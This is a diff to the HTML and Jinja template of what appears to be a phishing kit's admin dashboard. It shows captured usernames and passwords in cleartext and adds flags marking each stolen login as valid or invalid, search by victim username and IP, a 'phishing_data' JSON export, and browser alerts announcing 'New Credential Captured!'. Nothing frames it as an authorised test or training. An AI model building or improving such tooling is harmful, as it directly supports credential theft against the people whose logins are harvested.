@@ -170,6 +170,26 @@
             font-family: monospace;
         }
 
+        .status-badge {
+            padding: 5px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+        }
+
+        .status-valid {
+            background: rgba(46, 204, 113, 0.2);
+            color: #2ecc71;
+            border: 1px solid #2ecc71;
+        }
+
+        .status-invalid {
+            background: rgba(231, 76, 60, 0.2);
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+        }
+
         .no-data {
             text-align: center;
             padding: 60px 20px;
@@ -187,13 +207,27 @@
             margin-bottom: 20px;
         }
 
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .new-entry {
+            animation: pulse 2s ease-in-out;
+            background: rgba(102, 126, 234, 0.1) !important;
+        }
+
         @media (max-width: 768px) {
+            .stats-container {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
             table {
-                font-size: 14px;
+                font-size: 12px;
             }
 
             th, td {
-                padding: 10px 5px;
+                padding: 8px 4px;
             }
 
             .controls {
@@ -204,12 +238,79 @@
             .btn {
                 width: 100%;
             }
+
+            .filter-buttons {
+                flex-wrap: wrap;
+            }
+
+            .filter-btn {
+                flex: 1;
+                min-width: 80px;
+            }
         }
 
         .auto-refresh {
             color: #2ecc71;
             font-size: 14px;
             margin-left: 10px;
+        }
+
+        .search-box {
+            background: #16213e;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #0f1419;
+            border: 2px solid #2a2a3e;
+            border-radius: 5px;
+            color: #eee;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .search-input:focus {
+            border-color: #667eea;
+        }
+
+        .search-input::placeholder {
+            color: #7f8c8d;
+        }
+
+        .filter-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .filter-btn {
+            padding: 8px 16px;
+            background: #2a2a3e;
+            border: 2px solid #2a2a3e;
+            border-radius: 5px;
+            color: #eee;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .filter-btn:hover {
+            background: #3a3a4e;
+        }
+
+        .filter-btn.active {
+            background: #667eea;
+            border-color: #667eea;
+        }
+
+        tr.hidden {
+            display: none;
         }
     </style>
 </head>
@@ -225,22 +326,26 @@
 
     <div class="stats-container">
         <div class="stat-card">
-            <h3>Total Victims</h3>
+            <h3>Total Captures</h3>
             <div class="number">{{ credentials|length }}</div>
+        </div>
+        <div class="stat-card">
+            <h3>Valid Credentials</h3>
+            <div class="number" style="color: #2ecc71;">
+                {% set valid_count = credentials|selectattr('valid', 'equalto', True)|list|length %}
+                {{ valid_count }}
+            </div>
+        </div>
+        <div class="stat-card">
+            <h3>Invalid Attempts</h3>
+            <div class="number" style="color: #e74c3c;">
+                {% set invalid_count = credentials|selectattr('valid', 'equalto', False)|list|length %}
+                {{ invalid_count }}
+            </div>
         </div>
         <div class="stat-card">
             <h3>Session Status</h3>
             <div class="number" style="font-size: 24px; color: #2ecc71;">● ACTIVE</div>
-        </div>
-        <div class="stat-card">
-            <h3>Latest Capture</h3>
-            <div class="number" style="font-size: 18px;">
-                {% if credentials %}
-                    {{ credentials[-1]['timestamp'] }}
-                {% else %}
-                    N/A
-                {% endif %}
-            </div>
         </div>
     </div>
 
@@ -249,9 +354,21 @@
             <button onclick="location.reload()" class="btn btn-refresh">🔄 Refresh</button>
             <span class="auto-refresh">Auto-refresh: <span id="countdown">10</span>s</span>
         </div>
-        <form action="/admin/clear" method="POST" style="display: inline;" onsubmit="return confirm('Clear all captured data?');">
-            <button type="submit" class="btn btn-clear">🗑️ Clear All Data</button>
-        </form>
+        <div style="display: flex; gap: 10px;">
+            <button onclick="exportData()" class="btn btn-refresh" style="background: #3498db;">💾 Export JSON</button>
+            <form action="/admin/clear" method="POST" style="display: inline;" onsubmit="return confirm('Clear all captured data?');">
+                <button type="submit" class="btn btn-clear">🗑️ Clear All Data</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="search-box">
+        <input type="text" id="searchInput" class="search-input" placeholder="🔍 Search by username, IP address, or timestamp...">
+        <div class="filter-buttons">
+            <button class="filter-btn active" onclick="filterData('all')">All ({{ credentials|length }})</button>
+            <button class="filter-btn" onclick="filterData('valid')">Valid ({% set valid_count = credentials|selectattr('valid', 'equalto', True)|list|length %}{{ valid_count }})</button>
+            <button class="filter-btn" onclick="filterData('invalid')">Invalid ({% set invalid_count = credentials|selectattr('valid', 'equalto', False)|list|length %}{{ invalid_count }})</button>
+        </div>
     </div>
 
     <div class="credentials-table">
@@ -266,6 +383,7 @@
                     <th>#</th>
                     <th>Username</th>
                     <th>Password</th>
+                    <th>Status</th>
                     <th>Timestamp</th>
                     <th>IP Address</th>
                 </tr>
@@ -276,6 +394,13 @@
                     <td>{{ loop.index }}</td>
                     <td class="username">{{ cred['username'] }}</td>
                     <td class="password">{{ cred['password'] }}</td>
+                    <td>
+                        {% if cred.get('valid') %}
+                            <span class="status-badge status-valid">✓ VALID</span>
+                        {% else %}
+                            <span class="status-badge status-invalid">✗ INVALID</span>
+                        {% endif %}
+                    </td>
                     <td class="timestamp">{{ cred['timestamp'] }}</td>
                     <td class="ip-address">{{ cred['ip_address'] }}</td>
                 </tr>
@@ -291,6 +416,90 @@
     </div>
 
     <script>
+        // Export data as JSON
+        function exportData() {
+            const data = {{ credentials|tojson|safe }};
+            const dataStr = JSON.stringify(data, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `phishing_data_${new Date().toISOString().split('T')[0]}.json`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }
+
+        // Filter data by status
+        let currentFilter = 'all';
+        function filterData(filter) {
+            currentFilter = filter;
+            
+            // Update button states
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Apply filter
+            const rows = document.querySelectorAll('tbody tr');
+            rows.forEach(row => {
+                const statusBadge = row.querySelector('.status-badge');
+                if (!statusBadge) return;
+                
+                const isValid = statusBadge.classList.contains('status-valid');
+                
+                if (filter === 'all') {
+                    row.classList.remove('hidden');
+                } else if (filter === 'valid' && isValid) {
+                    row.classList.remove('hidden');
+                } else if (filter === 'invalid' && !isValid) {
+                    row.classList.remove('hidden');
+                } else {
+                    row.classList.add('hidden');
+                }
+            });
+            
+            // Re-apply search if active
+            const searchValue = document.getElementById('searchInput').value;
+            if (searchValue) {
+                performSearch(searchValue);
+            }
+        }
+
+        // Search functionality
+        function performSearch(query) {
+            const searchTerm = query.toLowerCase();
+            const rows = document.querySelectorAll('tbody tr');
+            
+            rows.forEach(row => {
+                // Skip if already hidden by filter
+                if (currentFilter !== 'all') {
+                    const statusBadge = row.querySelector('.status-badge');
+                    const isValid = statusBadge.classList.contains('status-valid');
+                    if ((currentFilter === 'valid' && !isValid) || (currentFilter === 'invalid' && isValid)) {
+                        return;
+                    }
+                }
+                
+                const username = row.querySelector('.username')?.textContent.toLowerCase() || '';
+                const ip = row.querySelector('.ip-address')?.textContent.toLowerCase() || '';
+                const timestamp = row.querySelector('.timestamp')?.textContent.toLowerCase() || '';
+                
+                if (username.includes(searchTerm) || ip.includes(searchTerm) || timestamp.includes(searchTerm)) {
+                    row.classList.remove('hidden');
+                } else {
+                    row.classList.add('hidden');
+                }
+            });
+        }
+
+        // Add search event listener
+        document.getElementById('searchInput')?.addEventListener('input', function(e) {
+            performSearch(e.target.value);
+        });
+
         // Auto-refresh countdown
         let countdown = 10;
         const countdownElement = document.getElementById('countdown');
@@ -314,11 +523,24 @@
                     lastCount = data.total_victims;
                     // Could play a notification sound here
                     console.log('🎣 New victim captured!');
+                    
+                    // Show browser notification if permitted
+                    if (Notification.permission === 'granted') {
+                        new Notification('New Credential Captured!', {
+                            body: `Total captures: ${data.total_victims}`,
+                            icon: '🎣'
+                        });
+                    }
                 }
             } catch (error) {
                 console.error('Error checking stats:', error);
             }
         }, 2000);
+
+        // Request notification permission
+        if (Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
     </script>
 </body>
 </html>
